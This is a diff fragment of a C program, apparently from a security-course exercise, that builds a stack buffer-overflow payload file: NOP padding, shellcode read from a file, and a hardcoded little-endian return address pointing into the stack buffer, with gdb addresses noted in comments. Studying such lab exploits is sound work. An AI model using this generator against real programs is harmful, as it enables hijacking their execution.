@@ -6,15 +6,15 @@
 // Function to convert bigEndian to littleEndian
 unsigned char* littleEndian(char *str, int numChars);
 
-// 0x7fffffffdc30 address of buf (according to gdb)
-// 0x7ffff7b99673 address of /bin/sh/
-// 0x7fffffffdca0 <- start of buf according to a.out
 
 // Defines
 #define ADDR_SIZE 8
 #define BITS_IN_BYTE 8
 #define NOP 0x90
+//a.out view of buf
 #define BUF_ADDR "0x7fffffffdca0"
+//Gdbs view of buf
+//#define BUF_ADDR "0x7fffffffdc30"
 
 int main(int argc, char *argv[]){
   FILE *file = fopen("in", "wb");
@@ -28,8 +28,8 @@ int main(int argc, char *argv[]){
   unsigned char *addr;
 
   // Store the address of the Buffer start.
-  addr = littleEndian( BUF_ADDR, 8 );
-
+  addr = littleEndian( BUF_ADDR, ADDR_SIZE );
+ 
   // Notify user with instructions on how to use the program
   if(argc != 3){
     printf("Wrong number of arguments, use ./gen [instructions] [num_bytes_in_buffer]\n");
@@ -40,7 +40,7 @@ int main(int argc, char *argv[]){
 
   // pull argument variables
   instFile = argv[1];
-  numChars = atoi(argv[2]) + 8; //add 8 bytes to skip over Frame Pointer
+  numChars = atoi(argv[2]) + ADDR_SIZE; //add 8 bytes to skip over Frame Pointer
 
   // open instructions for reading in binary
   instFp = fopen(instFile, "rb");
